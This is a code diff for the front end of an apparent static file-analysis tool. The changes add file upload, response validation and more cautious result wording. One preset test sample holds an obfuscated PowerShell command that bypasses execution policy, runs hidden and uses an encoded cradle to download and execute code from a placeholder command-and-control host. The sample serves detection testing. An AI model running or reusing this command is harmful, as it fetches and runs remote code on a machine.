@@ -1,3 +1,5 @@
+import { DetectorUpload } from '../components/analysis/DetectorUpload';
+import { apiFetch } from '../utils/apiClient';
 import React, { useState } from 'react';
 import {
   Binary,
@@ -13,6 +15,8 @@ import { apiUrl } from '../utils/apiClient';
 
 interface FileAnalysisResult {
   artifact_id: string;
+  classification: string;
+  summary: string;
   filename: string;
   sha256: string;
   sha1: string;
@@ -62,7 +66,7 @@ const SAMPLE_FILES = {
     content: '# CyberGuard Test Script\npowershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AbQBhAGwAaQBjAGkAbwB1AHMALgB0AG8AcAAvAHAAJwApAA==',
   },
   clean_pdf: {
-    name: 'Clean Authentic PDF Document',
+    name: 'PDF structure control',
     filename: 'financial_quarterly_report.pdf',
     description: 'Standard benign PDF document with linear page tree and zero embedded executable streams.',
     content: '%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n3 0 obj\n<< /Type /Page /Parent 2 0 R /Contents 4 0 R >>\nendobj\n4 0 obj\n<< /Length 44 >>\nstream\nBT /F1 12 Tf 72 712 Td (Quarterly Report) Tj ET\nendstream\nendobj\nxref\n0 5\n0000000000 65535 f \ntrailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n350\n%%EOF',
@@ -85,15 +89,16 @@ export const FileSecurityView: React.FC = () => {
     setErrorMsg(null);
   };
 
-  const handleAnalyze = async () => {
+  const handleAnalyze = async (uploadedFile?: File) => {
     setIsAnalyzing(true);
     setErrorMsg(null);
+    setResult(null);
     try {
       const blob = new Blob([contentPayload], { type: 'application/octet-stream' });
       const formData = new FormData();
-      formData.append('file', blob, filename);
+      formData.append('file', uploadedFile ?? blob, uploadedFile?.name ?? filename);
 
-      const res = await fetch(apiUrl('/api/files/analyze'), {
+      const res = await apiFetch(apiUrl('/api/files/analyze'), {
         method: 'POST',
         body: formData,
       });
@@ -103,8 +108,23 @@ export const FileSecurityView: React.FC = () => {
         throw new Error(errData.detail || `File inspection failed with status ${res.status}`);
       }
 
-      const data: FileAnalysisResult = await res.json();
-      setResult(data);
+      const data = await res.json();
+      if (!Number.isFinite(data.risk_score) || !Number.isFinite(data.entropy?.entropy) || !data.identity) {
+        throw new Error('File analysis response is incomplete; no safety conclusion can be displayed.');
+      }
+      setResult({
+        artifact_id: data.artifact_id, classification: data.classification, summary: data.summary,
+        filename: data.identity.original_filename, sha256: data.identity.sha256,
+        sha1: data.identity.sha1, md5: data.identity.md5, size_bytes: data.identity.size_bytes,
+        claimed_extension: data.identity.claimed_extension, detected_mime_type: data.identity.detected_mime,
+        is_type_disguised: data.findings.some((finding: { finding_type: string }) => finding.finding_type === 'FILE_TYPE_MISMATCH'),
+        shannon_entropy: data.entropy.entropy, is_packed_or_encrypted: data.entropy.is_high_entropy,
+        overall_risk_score: data.risk_score, overall_severity: data.severity,
+        threat_intel_verdict: data.reputation.verdict,
+        format_details: { pe_details: data.pe_metadata, pdf_details: data.pdf_metadata,
+          office_details: data.office_metadata, script_details: data.script_metadata, archive_details: data.archive_metadata },
+        findings: data.findings,
+      });
     } catch (err: any) {
       setErrorMsg(err.message || 'An error occurred during static file security analysis.');
     } finally {
@@ -138,10 +158,10 @@ export const FileSecurityView: React.FC = () => {
             </div>
             <div>
               <h1 className="text-xl font-bold tracking-tight text-foreground">
-                Attachment & Safe Static File Security Analyzer
+                Files & attachment analysis
               </h1>
               <p className="text-xs text-foreground-muted font-mono">
-                Section 8 — Disguised Double Extensions, PE Header Inspection, PDF Streams & Shannon Entropy Analysis
+                Inspect file bytes, metadata and embedded references. Static signals do not establish safety.
               </p>
             </div>
           </div>
@@ -149,13 +169,15 @@ export const FileSecurityView: React.FC = () => {
 
         <div className="flex items-center space-x-2">
           <span className="text-[11px] font-mono px-2.5 py-1 rounded-badge bg-surface-secondary border border-border text-foreground-muted">
-            Safe Non-Execution Sandbox
+            No file execution
           </span>
           <span className="text-[11px] font-mono px-2.5 py-1 rounded-badge bg-primary/10 border border-primary/30 text-primary font-semibold">
-            Section 8 Operational
+            Static checks
           </span>
         </div>
       </div>
+
+      <DetectorUpload title="Upload a file or attachment" description="Analyze original file bytes with static checks. Files are never executed." busy={isAnalyzing} onAnalyze={handleAnalyze} />
 
       {/* Preset Samples */}
       <div className="bg-surface rounded-card border border-border p-4 space-y-3">
@@ -210,7 +232,7 @@ export const FileSecurityView: React.FC = () => {
               Reset
             </button>
             <button
-              onClick={handleAnalyze}
+              onClick={() => void handleAnalyze()}
               disabled={isAnalyzing}
               className="px-4 py-1.5 text-xs font-semibold rounded bg-primary text-primary-foreground hover:bg-primary/90 transition-all flex items-center gap-1.5 cursor-pointer disabled:opacity-50"
             >
@@ -275,7 +297,7 @@ export const FileSecurityView: React.FC = () => {
             <div className="p-3 rounded-lg bg-surface border border-border space-y-1">
               <span className="text-[10px] font-mono text-foreground-muted uppercase">Disguised Type</span>
               <div className={`text-xs font-bold font-mono ${result.is_type_disguised ? 'text-red-400' : 'text-emerald-400'}`}>
-                {result.is_type_disguised ? 'YES (MISMATCH)' : 'VERIFIED MATCH'}
+                {result.is_type_disguised ? 'YES (MISMATCH)' : 'No mismatch found'}
               </div>
             </div>
 
@@ -288,6 +310,8 @@ export const FileSecurityView: React.FC = () => {
           </div>
 
           {/* Disguised Warning Banner */}
+          <div className="rounded-lg border border-border p-4"><strong>{result.classification.replaceAll('_', ' ')}</strong><p className="text-sm text-foreground-muted mt-2">{result.summary}</p></div>
+
           {result.is_type_disguised && (
             <div className="p-4 rounded-lg bg-red-500/10 border border-red-500/40 text-red-400 flex items-start gap-3">
               <FileWarning className="w-5 h-5 mt-0.5 shrink-0" />
